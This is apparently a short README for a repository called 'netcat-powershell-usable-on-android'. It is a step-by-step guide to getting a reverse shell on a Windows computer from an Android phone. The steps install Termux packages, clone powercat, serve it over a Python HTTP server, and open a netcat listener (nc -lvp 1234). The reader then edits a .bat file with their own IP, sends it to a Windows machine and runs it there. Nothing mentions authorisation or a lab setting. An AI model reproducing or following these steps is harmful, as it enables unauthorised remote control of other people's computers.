# netcat-powershell-usable-on-android
1# download termux from playstore 
apt update 
apt upgrade 
termux-setup-storage and do allow

apt install python
apt install python2
apt install git
apt install netcat

#2 git clone https://github.com/besimorhino/powercat.git 
#3 cd powercat
#4 python -m SimpleHTTPServer 80
#5 open a new session on termux and listen with netcat by using this command
nc -lvp 1234

now reopen another termux session and type ifconfig to know ur ipadress 

and edit it on the  netcat.bat file

send to a windows computer and run the vbs

u will get a shell in the netcat session that we opened earlier
thanks for reading:/
